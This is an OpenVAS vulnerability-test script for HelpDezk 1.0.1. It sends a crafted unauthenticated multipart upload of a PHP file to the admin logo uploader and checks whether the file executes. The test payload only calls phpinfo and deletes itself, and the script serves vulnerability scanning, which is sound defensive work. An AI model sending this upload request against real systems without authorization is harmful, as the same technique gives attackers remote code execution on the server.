###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_helpdezk_multiple_vuln_mar15.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# HelpDezk Multiple Vulnerabilities - Mar15
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805296");
  script_version("$Revision: 13994 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2015-03-03 15:53:33 +0530 (Tue, 03 Mar 2015)");
  script_name("HelpDezk Multiple Vulnerabilities - Mar15");

  script_tag(name:"summary", value:"This host is installed with HelpDezk
  is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is is able to upload file or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to,

  - Improper sanitization of user-uploaded files by the /admin/logos/upload
  script.

  - An error in the /admin/relPessoa/table_json/ script that is triggered when
  it performs access checks client-side using JavaScript.

  - The program fails to properly enforce authentication requirements.");

  script_tag(name:"impact", value:"Successful exploitation will allow
  remote attackers to utilize various admin functionality, execute any arbitrary
  script, and expose potentially sensitive information.");

  script_tag(name:"affected", value:"HelpDezk version 1.0.1");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"exploit");

  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2015/Feb/170");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/130573");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

http_port = get_http_port(default:80);
if(!can_host_php(port:http_port))
  exit(0);

host = http_host_name( port:http_port );

foreach dir (make_list_unique("/", "/helpdezk", "/helpdezk-community",  cgi_dirs(port:http_port))) {

  if( dir == "/" )
    dir = "";

  url = dir + "/admin/login";
  rcvRes = http_get_cache(item: url, port:http_port);
  if(rcvRes && ">helpdezk-community" >< rcvRes && ">HelpDEZK" >< rcvRes) {

    # nb: Used to get a current/valid cookie
    sndReq = http_get(item: url, port:http_port);
    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
    cookie = eregmatch(pattern:"(PHPSESSID=[a-z0-9]+)" , string:rcvRes);

    url = dir + '/admin/logos/upload';

    vtstrings = get_vt_strings();
    fileName = vtstrings["lowercase_rand"] + ".php";

    createdFile = 'top_' + fileName;

    postData = string('-----------------------------18670385921040103471088135293\r\n',
                      'Content-Disposition: form-data; name="file"; filename="', fileName, '"\r\n',
                      'Content-Type: text/html\r\n', '\r\n', '<?php phpinfo(); unlink("', createdFile, '" ); ?>\n',
                      '\r\n', '-----------------------------18670385921040103471088135293--\r\n');

    sndReq = string("POST ", url, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "Cookie: ", cookie [1], "\r\n",
                    "Content-Type: multipart/form-data; boundary=---------------------------18670385921040103471088135293\r\n",
                    "Content-Length: ", strlen(postData), "\r\n\r\n",
                    postData, "\r\n");

    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

    url = dir + "/app/uploads/logos/";
    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:"title>Index", extra_check:createdFile))
    {

      url = dir + '/app/uploads/logos/' + createdFile;
      if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
         pattern:">phpinfo\(\)<", extra_check:">PHP Documentation<"))
      {
        if(http_vuln_check(port:http_port, url:url, pattern:"O.*exist"))
        {
          security_message(port:http_port);
          exit(0);
        }
      }
    }
  }
}

exit(99);